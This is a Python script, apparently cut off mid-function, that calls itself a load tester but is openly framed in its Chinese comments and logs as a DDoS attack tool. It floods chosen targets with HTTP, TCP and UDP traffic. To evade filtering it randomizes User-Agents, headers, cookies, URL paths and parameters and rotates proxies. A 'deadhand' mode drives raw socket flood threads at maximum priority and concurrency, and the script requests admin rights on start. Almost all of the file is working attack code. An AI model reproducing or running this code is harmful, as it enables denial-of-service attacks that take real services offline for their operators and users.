#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import asyncio
import socket
import aiohttp
import threading
import random
from tqdm import tqdm
import platform
from colorama import Fore, init
import urllib.parse
import os
import json
import time
import signal
import string
import ssl
from datetime import datetime
import sys
import ctypes
import multiprocessing
import concurrent.futures
import psutil
import tkinter as tk
from tkinter import messagebox
import math
import gc  # 导入垃圾回收模块
import logging  # 导入日志模块
import subprocess
import requests
import tempfile
import re
import ipaddress


# nmap检查和安装函数
def check_and_install_nmap():
    """检查nmap是否已安装，如果未安装则下载并安装"""
    print(Fore.CYAN + "检查nmap是否已安装...")

    # 尝试导入nmap模块
    try:
        import nmap
        print(Fore.GREEN + "nmap已安装")
        return True
    except ImportError:
        # 导入失败，检查nmap是否在系统路径中
        nmap_installed = False
        try:
            if platform.system() == 'Windows':
                # 在Windows上检查nmap程序是否存在
                result = subprocess.run(['where', 'nmap'], capture_output=True, text=True)
                nmap_installed = result.returncode == 0
            else:
                # 在Linux/Mac上检查nmap程序是否存在
                result = subprocess.run(['which', 'nmap'], capture_output=True, text=True)
                nmap_installed = result.returncode == 0
        except:
            nmap_installed = False

        if nmap_installed:
            print(Fore.GREEN + "nmap已安装，正在安装Python接口...")
            # 安装python-nmap包
            subprocess.run([sys.executable, '-m', 'pip', 'install', 'python-nmap'])
            return True

        # nmap未安装，需要下载并安装
        print(Fore.YELLOW + "nmap未安装，正在准备下载...")

        # 显示安装确认对话框
        root = tk.Tk()
        root.withdraw()
        if not messagebox.askyesno("安装nmap",
                                   "需要安装nmap才能使用完整功能。\n是否下载并安装nmap？\n(大小约为14MB)"):
            print(Fore.RED + "用户取消了nmap安装，部分功能将不可用")
            root.destroy()
            return False
        root.destroy()

        # 下载nmap安装程序
        print(Fore.CYAN + "正在下载nmap安装程序...")
        nmap_url = "https://nmap.org/dist/nmap-7.95-setup.exe"
        temp_dir = tempfile.gettempdir()
        nmap_installer = os.path.join(temp_dir, "nmap-7.95-setup.exe")

        try:
            with requests.get(nmap_url, stream=True) as r:
                r.raise_for_status()
                total_size = int(r.headers.get('content-length', 0))

                with open(nmap_installer, 'wb') as f, tqdm(
                        desc="下载nmap",
                        total=total_size,
                        unit="B",
                        unit_scale=True,
                        unit_divisor=1024,
                ) as progress:
                    for chunk in r.iter_content(chunk_size=8192):
                        f.write(chunk)
                        progress.update(len(chunk))

            # 安装nmap
            print(Fore.CYAN + "正在安装nmap...")
            if platform.system() == 'Windows':
                # 以管理员权限运行安装程序
                if is_admin():
                    # 如果已有管理员权限，直接运行
                    subprocess.run([nmap_installer, '/S'], check=True)
                else:
                    # 否则请求管理员权限
                    ctypes.windll.shell32.ShellExecuteW(None, "runas", nmap_installer, '/S', None, 1)
                    print(Fore.YELLOW + "请在弹出的UAC对话框中允许安装...")
                    time.sleep(30)  # 等待安装完成

            # 安装python-nmap包
            print(Fore.CYAN + "正在安装Python的nmap接口...")
            subprocess.run([sys.executable, '-m', 'pip', 'install', 'python-nmap'])

            print(Fore.GREEN + "nmap安装完成！")

            # 添加nmap到PATH环境变量
            if platform.system() == 'Windows':
                print(Fore.CYAN + "正在更新PATH环境变量...")
                nmap_path = r"C:\Program Files (x86)\Nmap"
                if os.path.exists(nmap_path):
                    os.environ['PATH'] = nmap_path + os.pathsep + os.environ['PATH']
                    print(Fore.GREEN + "已将nmap添加到当前环境变量")

                    # 尝试重新导入nmap
                    try:
                        import nmap
                        print(Fore.GREEN + "nmap模块导入成功！")
                        return True
                    except ImportError:
                        print(Fore.RED + "nmap安装可能未完成，需要重启程序")
                        return False

            return True
        except Exception as e:
            print(Fore.RED + f"安装nmap时出错: {str(e)}")
            return False


# 在导入nmap之前检查并安装nmap
if check_and_install_nmap():
    try:
        import nmap
    except ImportError:
        print(Fore.RED + "导入nmap模块失败。请重启程序或手动安装nmap。")
        print(Fore.YELLOW + "您可以从以下网址下载nmap: https://nmap.org/dist/nmap-7.95-setup.exe")
        print(Fore.YELLOW + "或者运行命令: pip install python-nmap")
        input("按任意键继续，但扫描功能将不可用...")

# 初始化日志系统
LOG_DIR = "logs"
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

# 设置日志格式和文件
log_file = os.path.join(LOG_DIR, f"ddos_test_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")

# 配置控制台处理器，确保Windows系统支持UTF-8输出
console_handler = logging.StreamHandler(sys.stdout)
if platform.system() == 'Windows':
    # 尝试设置控制台为UTF-8模式
    try:
        import codecs

        sys.stdout = codecs.getwriter('utf-8')(sys.stdout.buffer)
    except Exception as e:
        print(f"警告: 无法设置控制台为UTF-8模式，可能影响某些字符显示: {str(e)}")

# 设置日志格式
formatter = logging.Formatter('%(asctime)s [%(levelname)s] %(message)s')

# 文件处理器 - 记录所有级别的日志
file_handler = logging.FileHandler(log_file, encoding='utf-8')
file_handler.setFormatter(formatter)
file_handler.setLevel(logging.DEBUG)

# 控制台处理器 - 只显示警告和错误
console_handler.setFormatter(formatter)
console_handler.setLevel(logging.WARNING)  # 只显示WARNING及以上级别

# 配置根日志记录器
logging.basicConfig(level=logging.DEBUG, handlers=[])
root_logger = logging.getLogger()
root_logger.addHandler(file_handler)
root_logger.addHandler(console_handler)

# 获取应用程序日志记录器
logger = logging.getLogger("DDoS_TEST")

# 初始化颜色支持
init(autoreset=True)


# 检查是否有管理员权限并尝试获取
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


# if不是管理员权限else重新以管理员权限启动
if platform.system() == 'Windows' and not is_admin():
    logger.warning("未以管理员权限运行，尝试请求管理员权限...")
    print(Fore.YELLOW + "正在请求管理员权限以提高性能...")
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit(0)

# 扩展流量混淆的 User-Agent 列表
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.55",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 OPR/78.0.4093.147",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0",
    "Mozilla/5.0 (Android 11; Mobile; LG-M255; rv:88.0) Gecko/88.0 Firefox/88.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0",
    "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 OPR/78.0.4093.147",
]

# 常见的请求头字段，用于混淆
COMMON_HEADERS = {
    "Accept": [
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "application/json,text/plain,*/*",
    ],
    "Accept-Language": [
        "en-US,en;q=0.9",
        "en-GB,en;q=0.9,en-US;q=0.8",
        "en-US,en;q=0.8,zh-CN;q=0.6,zh;q=0.4",
        "zh-CN,zh;q=0.9,en;q=0.8",
        "de-DE,de;q=0.9,en;q=0.8",
        "fr-FR,fr;q=0.9,en;q=0.8",
        "ja-JP,ja;q=0.9,en;q=0.8",
    ],
    "Accept-Encoding": [
        "gzip, deflate, br",
        "gzip, deflate",
        "br, gzip, deflate",
    ],
    "Cache-Control": [
        "max-age=0",
        "no-cache",
        "no-store, no-cache, must-revalidate",
    ],
    "Connection": [
        "keep-alive",
        "close",
    ],
    "DNT": ["1", "0"],
    "Upgrade-Insecure-Requests": ["1"],
    "Pragma": ["no-cache"],
    "Sec-Fetch-Dest": ["document", "empty", "image", "script", "style"],
    "Sec-Fetch-Mode": ["navigate", "cors", "no-cors", "same-origin"],
    "Sec-Fetch-Site": ["none", "same-origin", "cross-site", "same-site"],
    "Sec-Fetch-User": ["?1"],
}

# 常见URL路径和参数名，用于混淆
COMMON_PATH_SEGMENTS = [
    "api", "assets", "content", "images", "js", "css", "static", "media",
    "uploads", "files", "data", "resources", "public", "private", "admin",
    "login", "register", "user", "account", "profile", "settings", "dashboard",
    "blog", "news", "articles", "posts", "search", "about", "contact", "faq",
    "help", "support", "terms", "privacy", "legal", "store", "shop", "cart",
    "checkout", "products", "services", "categories", "tags", "index", "main",
    "home", "welcome", "default"
]

COMMON_PARAM_NAMES = [
    "id", "page", "limit", "offset", "q", "query", "search", "filter", "sort",
    "order", "direction", "start", "end", "from", "to", "date", "time", "timestamp",
    "token", "auth", "key", "api_key", "client_id", "user_id", "session",
    "category", "tag", "type", "format", "view", "mode", "action", "method",
    "callback", "jsonp", "lang", "locale", "country", "region", "timezone",
    "version", "v", "rev", "build", "platform", "device", "browser", "ref",
    "source", "campaign", "medium", "term", "content", "uid", "width", "height",
    "size", "quality", "color", "theme", "style", "layout", "template", "module",
    "component", "feature", "option", "setting", "config", "status", "state",
    "format", "fields", "include", "exclude", "expand", "collapse", "show", "hide"
]


class LoadTester:
    """负载测试工具（支持选择协议）Made by Brody-R."""

    def __init__(self, targets, request_size=1024, concurrency=100, timeout=30, protocol="http", proxies=None,
                 duration=None, deadhand_mode=False):
        # 预处理targets,解析出IP地址并确保URL格式正确
        self.targets = []
        logger.info(f"初始化LoadTester，使用协议: {protocol}")

        for target in targets:
            # 确保target不为空
            if not target or not isinstance(target, str):
                logger.warning(f"跳过无效目标: {target}")
                continue

            # 检查是否为纯IP地址
            is_ip = all(part.isdigit() and int(part) < 256 for part in target.replace(':', '.').split('.') if part)

            # 如果目标不包含协议前缀，添加当前选择的协议
            if '://' not in target:
                formatted_target = f"{protocol}://{target}"
                logger.info(f"添加协议前缀: {target} -> {formatted_target}")
            else:
                # 如果已有协议前缀，检查是否与用户选择的协议匹配
                target_protocol = target.split('://', 1)[0].lower()
                if target_protocol != protocol.lower():
                    logger.warning(f"目标 {target} 使用了与选定协议 {protocol} 不同的协议 {target_protocol}")
                    # 替换为用户选择的协议
                    formatted_target = f"{protocol}://{target.split('://', 1)[1]}"
                    logger.info(f"替换协议: {target} -> {formatted_target}")
                else:
                    formatted_target = target

            # 尝试解析主机名
            parsed_url = urllib.parse.urlparse(formatted_target)
            hostname = parsed_url.hostname

            # 如果解析失败，尝试直接提取主机名
            if not hostname:
                logger.warning(f"无法解析主机名: {formatted_target}，尝试直接提取")
                if '://' in formatted_target:
                    hostname = formatted_target.split('://', 1)[1].split('/', 1)[0].split(':', 1)[0]
                else:
                    hostname = formatted_target.split('/', 1)[0].split(':', 1)[0]

                # 重新构造URL
                if ':' in formatted_target.split('://', 1)[-1].split('/', 1)[0]:
                    # 有端口号
                    port = formatted_target.split('://', 1)[-1].split('/', 1)[0].split(':', 1)[1]
                    formatted_target = f"{protocol}://{hostname}:{port}"
                else:
                    # 没有端口号，使用默认端口
                    formatted_target = f"{protocol}://{hostname}"

                logger.info(f"重构URL: {formatted_target}")

            # 尝试解析IP地址 (如果需要)
            if not is_ip and hostname:
                try:
                    ip = socket.gethostbyname(hostname)
                    # 构建包含IP的URL
                    if parsed_url.port:
                        ip_target = f"{protocol}://{ip}:{parsed_url.port}"
                    else:
                        ip_target = f"{protocol}://{ip}"

                    logger.info(f"解析域名 {hostname} 为IP: {ip}, URL: {ip_target}")
                    self.targets.append(ip_target)
                except socket.gaierror:
                    logger.warning(f"无法解析主机名: {hostname}，将使用原始目标")
                    self.targets.append(formatted_target)
            else:
                # 直接使用格式化后的目标
                self.targets.append(formatted_target)

        # 如果没有有效目标，记录错误
        if not self.targets:
            logger.error("没有有效的攻击目标")
            print(Fore.RED + "错误: 没有有效的攻击目标!")

        # 输出最终的目标列表
        logger.info(f"最终攻击目标: {self.targets}")
        for i, target in enumerate(self.targets, 1):
            print(Fore.GREEN + f"目标 {i}: {target}")

        self.request_size = request_size
        self.concurrency = concurrency
        self.timeout = timeout
        self.protocol = protocol
        self.proxies = proxies
        self.total_data_sent = 0
        self.should_stop = threading.Event()  # 使用线程事件替代布尔值
        self.start_time = None
        self.end_time = None
        self.successful_requests = 0
        self.failed_requests = 0
        self.progress_bars = {}
        self.main_progress = None
        self.duration = duration  # 攻击持续时间（秒）
        self.enable_random_delay = True  # 启用随机延迟
        self.min_delay = 0.005  # 最小延迟（秒），降低以提高吞吐量
        self.max_delay = 0.2  # 最大延迟（秒），降低以提高吞吐量
        self.enable_path_randomization = True  # 启用路径随机化
        self.enable_param_randomization = True  # 启用参数随机化
        self.tasks = []  # 存储所有任务的引用
        self.loop = None  # 存储事件循环引用
        self.cpu_count = multiprocessing.cpu_count()  # 获取CPU核心数
        self.network_monitor_thread = None  # 网络监控线程
        self.dynamic_concurrency = True  # 启用动态并发调整
        self.max_concurrency = concurrency * 2  # 最大并发连接数
        self.deadhand_mode = deadhand_mode  # 死手模式
        self.sockets = []  # 存储所有创建的套接字
        self.threads = []  # 存储所有创建的线程
        # 请求统计变量
        self.request_count = 0  # 总请求计数
        self.success_count = 0  # 成功请求计数

        logger.info(
            f"初始化负载测试器: 目标={self.targets}, 协议={protocol}, 并发={concurrency}, 死手模式={deadhand_mode}")

        # 先导入math库供CPU密集计算使用
        if self.deadhand_mode:
            import math

        # 处理死手模式特殊设置
        if self.deadhand_mode:
            self.min_delay = 0  # 无延迟
            self.max_delay = 0.001  # 几乎无延迟
            self.max_concurrency = concurrency * 2000  # 极高的并发数
            self.request_size = max(request_size, 16384)  # 更大的请求大小
            # 启动CPU满载线程
            self._start_cpu_burnin_threads()

        # 优化CPU使用率设置
        if self.deadhand_mode:
            self.executor = concurrent.futures.ThreadPoolExecutor(
                max_workers=self.cpu_count * 200  # 死手模式下极大化线程数
            )
        else:
            self.executor = concurrent.futures.ThreadPoolExecutor(
                max_workers=min(32, self.cpu_count * 4)  # 根据CPU核心数动态设置
            )

        # 网络性能监控数据
        self.network_stats = {
            'last_bytes_sent': 0,
            'current_speed': 0,
            'peak_speed': 0,
            'speed_history': [],
        }

    def _start_cpu_burnin_threads(self):
        """启动网络攻击增强线程，确保攻击效果最大化"""
        print(Fore.RED + "启动网络攻击增强模块，最大化攻击效果...")

        # 提高进程优先级
        try:
            if platform.system() == 'Windows':
                # 设置为高优先级
                import psutil
                process = psutil.Process(os.getpid())
                process.nice(psutil.HIGH_PRIORITY_CLASS)

                # 提高网络相关线程的优先级
                print(Fore.RED + "提升网络线程优先级...")
            else:
                # Linux/MacOS设置为最高优先级(-20是最高)
                os.nice(-19)
            print(Fore.RED + "已将进程优先级提升至最高")
        except Exception as e:
            print(Fore.YELLOW + f"提升优先级警告: {str(e)}")

        # 预先准备攻击数据包以减少运行时负担
        self.attack_data_packets = []
        print(Fore.RED + "预生成攻击数据包...")
        for _ in range(10):
            if random.random() < 0.3:
                data = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(self.request_size))
            else:
                data = 'X' * self.request_size
            self.attack_data_packets.append(data.encode('utf-8'))

        # 启动额外的攻击线程
        self.extra_attack_threads = []

        # 创建辅助攻击函数，直接使用套接字进行更快的攻击
        def direct_socket_attack():
            """直接使用套接字发送数据，绕过更高层API的限制"""
            sockets = []
            targets = []

            # 解析目标
            for target in self.targets:
                parsed_url = urllib.parse.urlparse(target)
                host = parsed_url.hostname
                port = parsed_url.port if parsed_url.port else 80
                targets.append((host, port))

            # 创建多个连接
            for _ in range(50):  # 每个线程维护50个连接
                for host, port in targets:
                    try:
                        s = socket.socket(socket.AF_INET,
                                          socket.SOCK_DGRAM if self.protocol == "udp" else socket.SOCK_STREAM)
                        s.settimeout(1)  # 更短的超时
                        if self.protocol != "udp":
                            try:
                                s.connect((host, port))
                            except:
                                pass
                        sockets.append((s, (host, port)))
                    except:
                        pass

            # 持续发送数据包
            while not self.should_stop.is_set():
                for s, (host, port) in sockets:
                    try:
                        # 随机选择一个预生成的数据包
                        data = random.choice(self.attack_data_packets)

                        # UDP和TCP使用不同的发送方法
                        if self.protocol == "udp":
                            try:
                                # 连续多次发送以增加攻击强度
                                for _ in range(10):  # 每次循环发送10个包
                                    s.sendto(data, (host, port))
                                    self.total_data_sent += len(data)
                                    self.successful_requests += 1
                            except:
                                # 忽略错误，继续攻击
                                pass
                        else:
                            try:
                                # 对TCP连接连续发送多次数据
                                for _ in range(5):  # 每次循环发送5个包
                                    s.send(data)
                                    self.total_data_sent += len(data)
                                    self.successful_requests += 1
                            except:
                                # 如果连接断开，尝试重新连接
                                try:
                                    s.close()
                                    new_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                    new_socket.settimeout(1)
                                    new_socket.connect((host, port))
                                    # 更新套接字引用
                                    sockets.remove((s, (host, port)))
                                    sockets.append((new_socket, (host, port)))
                                except:
                                    pass
                    except:
                        # 忽略所有错误，保持攻击持续进行
                        pass

        # 启动多个直接攻击线程
        attack_thread_count = self.cpu_count * 2  # 每个CPU核心2个线程
        print(Fore.RED + f"启动 {attack_thread_count} 个增强攻击线程...")

        for _ in range(attack_thread_count):
            thread = threading.Thread(target=direct_socket_attack)
            thread.daemon = True
            thread.start()
            self.extra_attack_threads.append(thread)

        # 启动优化内存使用的线程
        def memory_optimization():
            """定期检查和优化内存使用"""
            while not self.should_stop.is_set():
                try:
                    # 检查内存使用情况
                    memory_percent = psutil.virtual_memory().percent
                    if memory_percent > 85:
                        # 内存使用过高，执行垃圾回收
                        gc.collect()
                    time.sleep(5)  # 每5秒检查一次
                except:
                    pass

        memory_thread = threading.Thread(target=memory_optimization)
        memory_thread.daemon = True
        memory_thread.start()

    def _get_random_user_agent(self):
        return random.choice(USER_AGENTS)

    def _get_random_headers(self):
        """生成随机的HTTP请求头"""
        headers = {
            "User-Agent": self._get_random_user_agent()
        }

        # 添加随机的请求头字段
        for header, values in COMMON_HEADERS.items():
            if random.random() < 0.7:  # 70%的概率添加这个头
                headers[header] = random.choice(values)

        # 添加随机的自定义头 (X-开头)
        if random.random() < 0.3:
            custom_header_name = f"X-{self._generate_random_string(5, 15)}"
            headers[custom_header_name] = self._generate_random_string(5, 30)

        # 添加随机的日期头
        if random.random() < 0.2:
            headers["Date"] = datetime.now().strftime("%a, %d %b %Y %H:%M:%S GMT")

        # 添加随机的Cookie (有时候会有)
        if random.random() < 0.4:
            cookie_parts = []
            for _ in range(random.randint(1, 5)):
                cookie_name = self._generate_random_string(3, 10)
                cookie_value = self._generate_random_string(5, 20)
                cookie_parts.append(f"{cookie_name}={cookie_value}")
            headers["Cookie"] = "; ".join(cookie_parts)

        # 添加IE特有的头 (有时候会有)
        if random.random() < 0.1:
            headers["X-UA-Compatible"] = "IE=edge"

        return headers

    def _generate_random_string(self, min_length=5, max_length=10):
        """生成随机字符串"""
        length = random.randint(min_length, max_length)
        chars = string.ascii_letters + string.digits
        return ''.join(random.choice(chars) for _ in range(length))

    def _randomize_url(self, url):
        """对URL进行随机变化，添加随机路径和参数"""
        if not self.enable_path_randomization and not self.enable_param_randomization:
            return url

        parsed_url = urllib.parse.urlparse(url)
        path = parsed_url.path
        query = parsed_url.query

        # 随机添加路径段
        if self.enable_path_randomization and random.random() < 0.5:
            if path.endswith('/') or not path:
                path += random.choice(COMMON_PATH_SEGMENTS)
            else:
                path += '/' + random.choice(COMMON_PATH_SEGMENTS)

        # 解析现有的查询参数
        query_params = urllib.parse.parse_qs(query)

        # 随机添加查询参数
        if self.enable_param_randomization and random.random() < 0.6:
            for _ in range(random.randint(1, 3)):
                param_name = random.choice(COMMON_PARAM_NAMES)
                param_value = self._generate_random_string(3, 15)
                query_params[param_name] = [param_value]

        # 重建查询字符串
        new_query = urllib.parse.urlencode(query_params, doseq=True)

        # 重建URL
        randomized_url = urllib.parse.urlunparse((
            parsed_url.scheme,
            parsed_url.netloc,
            path,
            parsed_url.params,
            new_query,
            parsed_url.fragment
        ))

        return randomized_url

    async def _send_http_request(self, session, target):
        try:
            # 对目标URL进行随机化
            randomized_target = self._randomize_url(target)

            # 获取随机的请求头
            headers = self._get_random_headers()

            # 创建随机数据
            if random.random() < 0.3:  # 30% 概率使用随机数据而不是重复字符
                data = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(self.request_size))
            else:
                data = 'X' * self.request_size

            # 随机选择请求方法
            method = random.choice(['GET', 'POST'] if random.random() < 0.8 else ['GET', 'POST', 'PUT', 'DELETE'])

            # 延迟随机化，但保持较低以提高吞吐量
            if self.enable_random_delay:
                await asyncio.sleep(random.uniform(self.min_delay, self.max_delay))

            if method == 'GET':
                async with session.get(randomized_target, headers=headers, ssl=False, timeout=self.timeout) as resp:
                    await resp.read()
                    self.total_data_sent += len(str(headers))
                    self.successful_requests += 1
                    return True
            else:
                async with session.request(method, randomized_target, data=data, headers=headers, ssl=False,
                                           timeout=self.timeout) as resp:
                    await resp.read()
                    data_size = len(data) + len(str(headers))
                    self.total_data_sent += data_size
                    self.successful_requests += 1
                    return True
        except Exception as e:
            self.failed_requests += 1
            return False

    def _get_proxy_settings(self):
        """获取代理设置"""
        if not self.proxies:
            return None

        # 随机选择一个代理
        proxy = random.choice(self.proxies)
        return proxy

    def _sync_tcp_request(self, target):
        # 解析URL
        parsed_url = urllib.parse.urlparse(target)
        host = parsed_url.hostname
        port = parsed_url.port if parsed_url.port else 80

        # 检查hostname是否为None，如果是则尝试直接从target中提取
        if host is None:
            logger.warning(f"无法从URL {target} 解析主机名，尝试直接提取")
            print(Fore.YELLOW + f"警告: 无法从URL {target} 解析主机名，尝试直接提取")

            # 移除协议前缀
            if '://' in target:
                host = target.split('://', 1)[1].split('/', 1)[0].split(':', 1)[0]
            else:
                host = target.split('/', 1)[0].split(':', 1)[0]

            # 重新尝试提取端口
            if ':' in target:
                try:
                    port_str = target.split(':', 1)[1].split('/', 1)[0]
                    port = int(port_str)
                except (ValueError, IndexError):
                    # 端口提取失败，使用默认端口
                    pass

            logger.debug(f"从URL提取的主机名: {host}, 端口: {port}")
            print(Fore.GREEN + f"使用提取的主机名: {host}, 端口: {port}")

        # 确保主机名不为空
        if not host:
            logger.error(f"无法确定目标主机名: {target}")
            print(Fore.RED + f"错误: 无法确定目标主机名: {target}")
            self.failed_requests += 1
            return False

        try:
            # 尝试解析主机名为IP地址
            try:
                ip = socket.gethostbyname(host)
                host = ip  # 使用解析后的IP
                logger.debug(f"解析主机名 {host} 为IP: {ip}")
            except socket.gaierror:
                # 如果解析失败但主机名看起来像IP地址，继续使用
                if all(part.isdigit() for part in host.split('.')):
                    logger.debug(f"使用IP格式的主机名: {host}")
                else:
                    logger.warning(f"无法解析主机名: {host}，但仍将尝试连接")

            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                # 添加随机连接超时，死手模式下更短
                s.settimeout(random.uniform(0.5, 2) if self.deadhand_mode else random.uniform(1, self.timeout))

                # 尝试通过代理连接（如果有）
                proxy_used = False
                if self.proxies and random.random() < 0.9:  # 90% 概率使用代理
                    proxy = random.choice(self.proxies)
                    if proxy.startswith('socks'):
                        # 这里需要添加 socks 代理支持
                        # 为简单起见，如果需要 socks 代理，需要安装 PySocks
                        # 并修改为使用 socks.socksocket
                        pass

                # 连接前日志记录
                logger.info(f"尝试连接到 {host}:{port}")

                try:
                    s.connect((host, port))
                except (socket.timeout, ConnectionRefusedError, OSError) as conn_err:
                    logger.error(f"连接到 {host}:{port} 失败: {str(conn_err)}")
                    print(Fore.RED + f"连接失败: {host}:{port} - {str(conn_err)}")
                    self.failed_requests += 1
                    return False

                logger.info(f"成功连接到 {host}:{port}")

                # 死手模式下发送更多数据
                if self.deadhand_mode:
                    # 使用预生成的数据包或生成新数据
                    if hasattr(self, 'attack_data_packets'):
                        data = random.choice(self.attack_data_packets)
                    else:
                        if random.random() < 0.3:
                            data = ''.join(random.choice(string.ascii_letters + string.digits)
                                           for _ in range(self.request_size)).encode('utf-8')
                        else:
                            data = (b'X' * self.request_size)

                    # 连续发送多次数据
                    for _ in range(20):  # 增加发送次数
                        s.sendall(data)
                        self.total_data_sent += len(data)

                    self.successful_requests += 1
                    return True
                else:
                    # 非死手模式下的原有逻辑
                    # 生成随机数据
                    if random.random() < 0.3:
                        data = ''.join(
                            random.choice(string.ascii_letters + string.digits) for _ in range(self.request_size))
                    else:
                        data = 'X' * self.request_size

                    s.sendall(data.encode('utf-8'))
                    self.total_data_sent += len(data)
                    self.successful_requests += 1
                    return True

        except Exception as e:
            logger.error(f"TCP请求失败: {str(e)}")
            print(Fore.RED + f"TCP请求失败: {str(e)}")
            self.failed_requests += 1
            return False

    def _sync_udp_request(self, target):
        # 解析URL
        parsed_url = urllib.parse.urlparse(target)
        host = parsed_url.hostname
        port = parsed_url.port if parsed_url.port else 80

        # 检查hostname是否为None，如果是则尝试直接从target中提取
        if host is None:
            logger.warning(f"无法从URL {target} 解析主机名，尝试直接提取")
            print(Fore.YELLOW + f"警告: 无法从URL {target} 解析主机名，尝试直接提取")

            # 移除协议前缀
            if '://' in target:
                host = target.split('://', 1)[1].split('/', 1)[0].split(':', 1)[0]
            else:
                host = target.split('/', 1)[0].split(':', 1)[0]

            # 重新尝试提取端口
            if ':' in target:
                try:
                    port_str = target.split(':', 1)[1].split('/', 1)[0]
                    port = int(port_str)
                except (ValueError, IndexError):
                    # 端口提取失败，使用默认端口
                    pass

            logger.info(f"从URL提取的主机名: {host}, 端口: {port}")
            print(Fore.GREEN + f"使用提取的主机名: {host}, 端口: {port}")

        # 确保主机名不为空
        if not host:
            logger.error(f"无法确定目标主机名: {target}")
            print(Fore.RED + f"错误: 无法确定目标主机名: {target}")
            self.failed_requests += 1
            return False

        try:
            # 尝试解析主机名为IP地址
            try:
                ip = socket.gethostbyname(host)
                logger.debug(f"解析主机名 {host} 为IP: {ip}")
            except socket.gaierror:
                # 如果解析失败但主机名看起来像IP地址，继续使用
                if all(part.isdigit() for part in host.split('.')):
                    ip = host  # 使用IP格式的主机名
                    logger.debug(f"使用IP格式的主机名: {ip}")
                else:
                    logger.error(f"无法解析主机名: {host}")
                    print(Fore.RED + f"错误: 无法解析主机名: {host}")
                    self.failed_requests += 1
                    return False

            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                # 死手模式下发送更多数据
                if self.deadhand_mode:
                    # 生成或使用预生成的数据包
                    if hasattr(self, 'attack_data_packets'):
                        data = random.choice(self.attack_data_packets)
                    else:
                        if random.random() < 0.3:
                            data = ''.join(random.choice(string.ascii_letters + string.digits)
                                           for _ in range(self.request_size)).encode('utf-8')
                        else:
                            data = (b'X' * self.request_size)

                    # 连接前日志记录
                    logger.debug(f"UDP发送数据到 {ip}:{port}")

                    # 连续发送多个数据包以增加有效负载
                    try:
                        for _ in range(50):  # 大幅增加每次发送的包数
                            s.sendto(data, (ip, port))
                            self.total_data_sent += len(data)
                    except (socket.timeout, OSError) as send_err:
                        logger.error(f"UDP发送到 {ip}:{port} 失败: {str(send_err)}")
                        print(Fore.RED + f"UDP发送失败: {ip}:{port} - {str(send_err)}")
                        self.failed_requests += 1
                        return False

                    self.successful_requests += 1
                    return True
                else:
                    # 非死手模式下的原有逻辑
                    # 生成随机数据包
                    if random.random() < 0.3:
                        data = ''.join(
                            random.choice(string.ascii_letters + string.digits) for _ in range(self.request_size))
                    else:
                        data = 'X' * self.request_size

                    data_encoded = data.encode('utf-8')
                    logger.debug(f"UDP发送数据到 {ip}:{port}")

                    # 发送随机次数的数据包
                    packets = random.randint(1, 3) if random.random() < 0.2 else 1
                    try:
                        for _ in range(packets):
                            s.sendto(data_encoded, (ip, port))
                            self.total_data_sent += len(data_encoded)

                            # 随机延迟
                            if self.enable_random_delay and packets > 1:
                                time.sleep(random.uniform(self.min_delay, self.max_delay))
                    except (socket.timeout, OSError) as send_err:
                        logger.error(f"UDP发送到 {ip}:{port} 失败: {str(send_err)}")
                        print(Fore.RED + f"UDP发送失败: {ip}:{port} - {str(send_err)}")
                        self.failed_requests += 1
                        return False

                    self.successful_requests += 1
                    return True
        except Exception as e:
            logger.error(f"UDP请求失败: {str(e)}")
            print(Fore.RED + f"UDP请求失败: {str(e)}")
            self.failed_requests += 1
            return False

    def _monitor_network_performance(self):
        """监控网络性能并打印统计信息"""
        prev_request_count = 0
        prev_success_count = 0
        prev_time = time.time()
        prev_sent_bytes = 0
        prev_recv_bytes = 0

        while not self.should_stop.is_set():
            time.sleep(2)  # 每2秒更新一次

